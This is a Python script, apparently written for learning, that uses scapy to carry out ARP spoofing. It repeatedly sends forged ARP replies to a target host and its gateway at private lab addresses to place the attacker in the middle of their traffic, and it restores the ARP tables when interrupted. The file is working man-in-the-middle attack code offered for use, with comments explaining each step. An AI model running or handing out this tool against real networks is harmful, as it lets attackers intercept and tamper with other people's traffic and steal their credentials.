from tabnanny import verbose
import scapy.all as scapy 
import time 
 
# This is a function that returns us the MAC address of our desired IP address 
# In the get_mac() fucntion,whatever IP address in entered is used to create an arp_request using ARP() fucntion 
# and we set the broadcast mac address to "ff:ff:ff:ff:ff:ff" using the Ether function 
def get_mac(ip): 
    arp_request = scapy.ARP(pdst = ip) 
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff") 
    # We now need to join these into a single packet, therefore we use the / to do so 
    arp_request_broadcast = broadcast / arp_request 
    # The srp() fucntion returns two lists of the IP address that responded to the packet and that didn't respond. 
    # The MAC address that has the matching IP address that was requested would be stored in the hwsrc field. 
    # We return this MAC address to where the function was called. 
    answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0] 
    return answered_list[0][1].hwsrc 

# This function takes two parameters the target ip and the spoofing ip.
# We use the ARP() function again to devise a packet that modifies the ARP table of the gateway and Target and use the send() function to start spoofing.
def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = get_mac(target_ip), psrc = spoof_ip)
    scapy.send(packet, verbose = False)

# This fucntion play the role of re-updating the ARP tables back to their default values
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
    scapy.send(packet, verbose = False)

if __name__ == '__main__':
    # To know what are the fields offered by scapy
    print(scapy.ls(scapy.ARP))

    # Now we call the spoof function to start ARP Spoofing
    # Enter your target IP
    target_ip = "10.0.2.5" 
    # Enter your gateway's IP
    gateway_ip = "10.0.2.1"
    try :
        sent_packets_count = 0
        # We used the loop while, because if we will remove it the ARP tables will update once.
        # If we do not keep updating them continuously, then by default the Target's ARP Table would correct itself to default
        while True :
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            # To display the numbers of packets sent
            sent_packets_count = sent_packets_count + 2
            print("\r[*] Packets Sent " +str(sent_packets_count),end="")
            time.sleep(2) # Waits for 2 seconds
    except KeyboardInterrupt:
        # This code would keep running if we don't give it an interrupt to stop that's why we used excpet
        print("\nCtrl + C pressed .............. Exiting")
        # Finally this code will stop whenever it gets a Keyboard interrupt
        # But we still need to re-update teh ARP tables back to their default values, this is why we created the restore function 
        restore(gateway_ip,target_ip)
        restore(target_ip,gateway_ip)
        print("[+] ARP Spoof Stopped") 


    
